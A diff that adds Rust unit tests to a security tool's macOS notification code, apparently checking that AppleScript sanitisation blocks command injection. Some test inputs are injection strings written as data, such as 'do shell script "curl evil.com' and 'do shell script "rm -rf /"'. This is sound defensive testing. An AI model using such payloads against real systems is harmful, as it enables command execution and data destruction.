@@ -123,8 +123,265 @@ fn send_notification(summary: &str, body: &str) -> Result<(), String> {
 }
 
 #[cfg(test)]
+#[allow(clippy::expect_used)]
 mod tests {
     use super::*;
+    use sanctum_types::threat::{Action, ThreatCategory, ThreatEvent, ThreatLevel};
+    use std::path::PathBuf;
+
+    /// Helper to build a `ThreatEvent` with customizable fields.
+    fn make_event(
+        level: ThreatLevel,
+        category: ThreatCategory,
+        description: &str,
+        path: &str,
+    ) -> ThreatEvent {
+        ThreatEvent {
+            timestamp: chrono::Utc::now(),
+            level,
+            category,
+            description: description.into(),
+            source_path: PathBuf::from(path),
+            creator_pid: Some(42),
+            creator_exe: Some(PathBuf::from("/usr/bin/python3")),
+            action_taken: Action::Alerted,
+        }
+    }
+
+    // ── AppleScript command construction ───────────────────────────
+
+    #[test]
+    fn applescript_command_is_well_formed() {
+        // Verify the send_notification path builds a correctly structured
+        // AppleScript display-notification string after sanitisation.
+        let summary = "Sanctum: CRITICAL - Suspicious .pth file detected";
+        let body = "evil payload | Path: /tmp/evil.pth | Action: Quarantined";
+        let safe_body = sanitize_for_applescript(body);
+        let safe_summary = sanitize_for_applescript(summary);
+        let script = format!(
+            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
+        );
+        assert!(script.starts_with("display notification \""));
+        assert!(script.contains("\" with title \""));
+        assert!(script.ends_with('"'));
+        // No unescaped quotes inside the two string literals
+        let inner = &script["display notification \"".len()..];
+        let parts: Vec<&str> = inner.splitn(2, "\" with title \"").collect();
+        assert_eq!(parts.len(), 2, "script should have exactly two string literals");
+        assert!(
+            !parts[0].contains('"'),
+            "body literal must not contain bare quotes"
+        );
+        // parts[1] ends with a trailing quote; strip it and check
+        let title_inner = parts[1].strip_suffix('"').expect("trailing quote");
+        assert!(
+            !title_inner.contains('"'),
+            "title literal must not contain bare quotes"
+        );
+    }
+
+    #[test]
+    fn applescript_sanitises_injection_in_constructed_command() {
+        let malicious_summary = "Sanctum\"\ndo shell script \"id";
+        let malicious_body = "payload\"\ndo shell script \"curl evil.com";
+        let safe_body = sanitize_for_applescript(malicious_body);
+        let safe_summary = sanitize_for_applescript(malicious_summary);
+        let script = format!(
+            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
+        );
+        assert!(!script.contains('\n'), "newlines must not survive in script");
+        // Count quotes: should be exactly 4 (the delimiters)
+        let quote_count = script.chars().filter(|&c| c == '"').count();
+        assert_eq!(
+            quote_count, 4,
+            "script should have exactly 4 delimiter quotes, got {quote_count}"
+        );
+    }
+
+    // ── Special characters in ThreatEvent don't panic ──────────────
+
+    #[test]
+    fn notify_threat_with_special_characters_does_not_panic() {
+        let nasty_descriptions = [
+            "normal description",
+            "",
+            "has \"double quotes\" inside",
+            "has 'single quotes' inside",
+            "null\x00byte",
+            "newline\nand\ttab",
+            "backslash\\escape",
+            "unicode: \u{1F4A3}\u{200B}\u{00E9}",
+            "combo: \"\n\\do shell script \"rm -rf /\"",
+            &"a".repeat(10_000), // very long string
+        ];
+        let nasty_paths = [
+            "/normal/path.pth",
+            "/path with spaces/file.pth",
+            "/path/with\"quotes/file.pth",
+            "/path/with\nnewline/file.pth",
+            "",
+        ];
+
+        for desc in &nasty_descriptions {
+            for path in &nasty_paths {
+                let event = make_event(
+                    ThreatLevel::Critical,
+                    ThreatCategory::PthInjection,
+                    desc,
+                    path,
+                );
+                // Must not panic — we only care that the formatting logic runs
+                // without crashing, not that the notification actually sends.
+                notify_threat(&event);
+            }
+        }
+    }
+
+    // ── Category display mapping ───────────────────────────────────
+
+    #[test]
+    fn every_category_produces_non_empty_display() {
+        let categories = [
+            ThreatCategory::PthInjection,
+            ThreatCategory::SiteCustomize,
+            ThreatCategory::CredentialAccess,
+            ThreatCategory::NetworkAnomaly,
+        ];
+        for cat in &categories {
+            let event = make_event(ThreatLevel::Info, *cat, "test", "/tmp/test");
+            let display = category_display(&event);
+            assert!(
+                !display.is_empty(),
+                "category_display for {cat:?} must be non-empty"
+            );
+        }
+    }
+
+    #[test]
+    fn category_display_returns_distinct_strings() {
+        let categories = [
+            ThreatCategory::PthInjection,
+            ThreatCategory::SiteCustomize,
+            ThreatCategory::CredentialAccess,
+            ThreatCategory::NetworkAnomaly,
+        ];
+        let displays: Vec<&str> = categories
+            .iter()
+            .map(|cat| {
+                let event = make_event(ThreatLevel::Info, *cat, "test", "/tmp/test");
+                category_display(&event)
+            })
+            .collect();
+        // All display strings should be unique
+        let mut unique = displays.clone();
+        unique.sort_unstable();
+        unique.dedup();
+        assert_eq!(
+            displays.len(),
+            unique.len(),
+            "each category should have a distinct display string"
+        );
+    }
+
+    // ── Severity display mapping ───────────────────────────────────
+
+    #[test]
+    fn every_severity_produces_non_empty_summary() {
+        let levels = [ThreatLevel::Info, ThreatLevel::Warning, ThreatLevel::Critical];
+        for level in &levels {
+            let event = make_event(*level, ThreatCategory::PthInjection, "test", "/tmp/t");
+            let summary = match event.level {
+                ThreatLevel::Critical => {
+                    format!("Sanctum: CRITICAL - {}", category_display(&event))
+                }
+                ThreatLevel::Warning => {
+                    format!("Sanctum: Warning - {}", category_display(&event))
+                }
+                ThreatLevel::Info => format!("Sanctum: {}", category_display(&event)),
+            };
+            assert!(
+                !summary.is_empty(),
+                "summary for {level:?} must be non-empty"
+            );
+        }
+    }
+
+    #[test]
+    fn severity_summary_contains_level_indicator() {
+        let event_critical =
+            make_event(ThreatLevel::Critical, ThreatCategory::PthInjection, "d", "/p");
+        let event_warning =
+            make_event(ThreatLevel::Warning, ThreatCategory::PthInjection, "d", "/p");
+        let event_info =
+            make_event(ThreatLevel::Info, ThreatCategory::PthInjection, "d", "/p");
+
+        let fmt = |e: &ThreatEvent| match e.level {
+            ThreatLevel::Critical => format!("Sanctum: CRITICAL - {}", category_display(e)),
+            ThreatLevel::Warning => format!("Sanctum: Warning - {}", category_display(e)),
+            ThreatLevel::Info => format!("Sanctum: {}", category_display(e)),
+        };
+
+        assert!(
+            fmt(&event_critical).contains("CRITICAL"),
+            "critical summary should contain CRITICAL"
+        );
+        assert!(
+            fmt(&event_warning).contains("Warning"),
+            "warning summary should contain Warning"
+        );
+        assert!(
+            fmt(&event_info).starts_with("Sanctum:"),
+            "info summary should start with Sanctum:"
+        );
+    }
+
+    // ── Full notify_threat path ────────────────────────────────────
+
+    #[test]
+    fn notify_threat_runs_all_severity_category_combinations() {
+        // Exercise every combination of level and category to ensure
+        // no match arm is missing and nothing panics.
+        let levels = [ThreatLevel::Info, ThreatLevel::Warning, ThreatLevel::Critical];
+        let categories = [
+            ThreatCategory::PthInjection,
+            ThreatCategory::SiteCustomize,
+            ThreatCategory::CredentialAccess,
+            ThreatCategory::NetworkAnomaly,
+        ];
+        let actions = [Action::Logged, Action::Alerted, Action::Quarantined, Action::Blocked];
+
+        for level in &levels {
+            for cat in &categories {
+                for action in &actions {
+                    let event = ThreatEvent {
+                        timestamp: chrono::Utc::now(),
+                        level: *level,
+                        category: *cat,
+                        description: "test event".into(),
+                        source_path: PathBuf::from("/tmp/test.pth"),
+                        creator_pid: None,
+                        creator_exe: None,
+                        action_taken: *action,
+                    };
+                    // notify_threat returns () — it logs errors internally.
+                    // We just verify it doesn't panic on any combination.
+                    notify_threat(&event);
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn send_notification_returns_ok_or_err() {
+        // send_notification should return Ok on macOS (osascript exists)
+        // or return an Err on systems without the notification backend.
+        // Either way it must not panic.
+        let result = send_notification("Test Title", "Test Body");
+        // We accept both Ok and Err — the important thing is no panic.
+        let _ = result;
+    }
+
+    // ── Existing sanitize_for_applescript tests ────────────────────
 
     #[test]
     fn sanitize_preserves_safe_characters() {
